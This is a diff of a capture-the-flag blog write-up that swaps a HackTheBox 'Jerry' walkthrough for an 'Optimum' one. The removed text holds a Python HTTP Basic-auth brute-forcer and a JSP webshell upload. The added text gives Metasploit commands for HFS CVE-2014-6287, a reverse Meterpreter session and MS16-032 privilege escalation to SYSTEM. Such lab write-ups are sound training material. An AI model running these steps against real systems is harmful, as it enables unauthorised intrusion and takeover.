@@ -14,91 +14,79 @@ It continues to be catchups time for me, as I write up retired HTB boxes that I 
 
 As we always do with HTB boxes, we will begin with some NMap reconnaisance. We first conduct a scan against the top 1000 ports, with scripts enabled:
 
-`sudo nmap -v -sC -sS -oX nmap-10-10-10-7-scripted.xml 10.10.10.7`,
+`sudo nmap -v -sC -sS -oN nmap-10-10-10-8-scripted.nmap 10.10.10.8`,
 
 and follow that up with a non-script scan of all 65535 ports:
 
-`nmap -v -p- -oX nmap-10-10-10-7-full.xml 10.10.10.7`
+`nmap -v -p- -oN nmap-10-10-10-8-full.nmap 10.10.10.8`
 
 We find the following ports are open:
 
 | port      | state | service          |
 | --------- | ----- | ---------------- |
-| 8080/tcp  | open  |    http-proxy    |
+|  80/tcp   | open  |       http       |
 
-The script scan grabs the banner info from the server, showing that it is running version 7.0.88 of Apache Tomcat.
+The script scan grabs the banner info from the server, which isn't too enlightening:
+
+```
+PORT   STATE SERVICE
+80/tcp open  http
+|_http-title: HFS /
+```
 
 ### Web Reconnaisance
 
-Navigating to `10.10.10.95:8080` in our browser shows us a default-looking Tomcat welcome screen. This is interesting, since it indicates that the site is incomplete, and may have been put up in a rush. If the devs didn't bother to change the landing page, what else did they not bother to change?
+When we navigate to `http://10.10.10.8/`, we see that it is running an HTTPFileServer instance. The name alone sounds juicy (LFI/file upload options?)
 
-[<img src="{{ site.baseurl }}/images/security/jerry/tomcat-welcome.png" alt="Tomcat default welcome screen" style="width: 400px;"/>]({{ site.baseurl }}/images/security/jerry/tomcat-welcome.png)
+[<img src="{{ site.baseurl }}/images/security/optimum/hfs.png" alt="HTTPFileServer" style="width: 400px;"/>]({{ site.baseurl }}/images/security/optimum/hfs.png)
 
-Trying to navigate away to the server status page, the manager app, or the host manager, pops up an HTTP Basic authentication prompt. Not much else we can do from here.
-
-[<img src="{{ site.baseurl }}/images/security/jerry/tomcat-auth.png" alt="Tomcat authentication prompt" style="width: 400px;"/>]({{ site.baseurl }}/images/security/jerry/tomcat-auth.png)
-
-A quick search online for CVEs against this version of Tomcat reveals `https://www.cvedetails.com/cve/CVE-2019-0232/`: an RCE *with* a Metasploit module!
+When we look online for CVEs, we find [CVE-2014-6287](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2014-6287). This exploits a flaw in the RegEx conducting filtering of macros in the search function, which makes it stop parsing at a NULL byte (`%00`), allowing us to insert code *after* the NULL, which will then be executed. The vulnerability has a Metasploit module exploiting it. Looks like a good option for us.
 
 ## Exploitation
 
-So let's try to exploit this vulnerability. We boot up Metasploit, choose the appropriate exploit module
+So, we open up Metasploit, and choose the HFS exploit
 
-`use exploit/windows/http/tomcat_cgi_cmdlineargs`,
+`use exploit/windows/http/rejetto_hfs_exec`,
 
-set the target
+set the target host:
 
-`set rhosts 10.10.10.95`,
+`set rhosts 10.10.10.8`
 
-and `run` the exploit...
+and set the listener to listen on our HTB VPN interface:
 
-And it's not exploitable. Darn. 
+`set lhost tun0`
 
-Not seeing any other immediate options, let's see if we can brute-force the HTTP Basic login. This isn't as much of a shot in the dark as you may think; we already know that the site has not been configured particularly well (see above), so maybe they've kept a default password.
+Running the exploit gives us a Meterpreter shell; hooray!
 
-We can quickly put together a python script which can run through a list of credentials, and try each in turn against an HTTP Basic authentication endpoint:
+[<img src="{{ site.baseurl }}/images/security/optimum/metasploit.png" alt="Meterpreter shell" style="width: 400px;"/>]({{ site.baseurl }}/images/security/optimum/metasploit.png)
 
-```python
-import requests
-import argparse
+From here we can immediately grab `user.txt`. But we're in as a low-privilege user right now, so we'll need to privesc in order to get `root.txt`
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Does a basic bruteforce, using HTTP Basic Authentication, against a web endpoint.")
-    parser.add_argument("credslist", type=str, help="A list of credentials, one set per line, in format [username]:[password]")
-    parser.add_argument("target", type=str, help="The target URL to authenticate against")
+## Privilege Escalation
 
-    args = parser.parse_args()
-    success = False
+Our current user is `OPTIMUM\kostas`. We do a quick bit of enumeration via `sysinfo`, which shows that we are on Windows Server 2012 R2 64-bit.
 
-    with open(args.credslist) as f:
-        for line in f:
-            creds = line.strip("\n").split(":")
-            response = requests.get(args.target, auth=(creds[0], creds[1]))
+Since it's 64-bit, our first step is to migrate into a 64-bits process:
 
-            if response.status_code == 200:
-                print("[+] Valid credentials: {}:{}".format(creds[0], creds[1]))
-                success = True
-                break
+- Find the PID of a 64-bit process that is unlikely to die any time soon (`explorer.exe` is often a good choice) using `ps`
+- `migrate <PID>`
 
-    if success != True:
-        print("[-] No valid credentials found.")
-```
+Next, we'll see if there are any privesc modules built in to Metasploit that might help us here. 
 
-We then run this by: `python3 http-basic-auth-bruteforce.py /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html`. Leaving it a short time returns us the credentials: `tomcat:s3cret`. Very secure(!)
+- Background the meterpreter session: `bg`
+- Search for local windows exploits: `search exploit/windows/local`
+- Find one which is well-rated and looks like it would apply to Server 2012 R2. `ms16-032` is a good shout.
 
-Using these credentials, we log in to the Web Application Manager interface. This interface allows us to upload WAR files to be run on the server. Juicy.
+Let's run our exploit (if you chose a different one, then replace `ms16_032_secondary_logon_handle_privesc` with the appropriate module name):
 
-[<img src="{{ site.baseurl }}/images/security/jerry/tomcat-app-man.png" alt="Tomcat Web App Manager" style="width: 400px;"/>]({{ site.baseurl }}/images/security/jerry/tomcat-app-man.png)
+- Select the exploit: `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
+- Set the listener to the tunnel interface: `set lhost tun0`
+- Set the exploit to run on the meterpreter session: `set session 1`
 
-Quickly hopping over to Github to grab a JSP webshell (I plan to code up one of my own at some point, but hey ho): `https://github.com/tennc/webshell/blob/master/jsp/jspbrowser/Browser.jsp`. We then compile this: `jar -cvf monitoring.war index.jsp`; we choose the name so as to fly under the radar a little.
-
-Uploading this gives us access to the filesystem, from where we can apparently view files owned by `root`, because I guess they're running Tomcat as `root`. No privesc needed!
+Running the exploit gets us `SYSTEM`. W00t!
 
 ## Conclusion
 
-Hope you enjoyed this walkthrough and the box; quite a fun little easy box. Stay tuned for more walkthroughs, as I start to catch up with the backlog of boxes I want to write up.
+This was a nice easy box. The initial foothold was a good example of why good input sanitisation is so important. And the privilege escalation is a nice little exercise in Metasploit footwork.
 
-As always, you can head to my GitHub to see [a bit of a more "professional report"-style writeup](https://github.com/cybersecmoo/writeups/blob/jerry/htb/boxes/jerry.md), if that's your bag.
-
-Thanks for reading!
-
+Hope you enjoyed! 
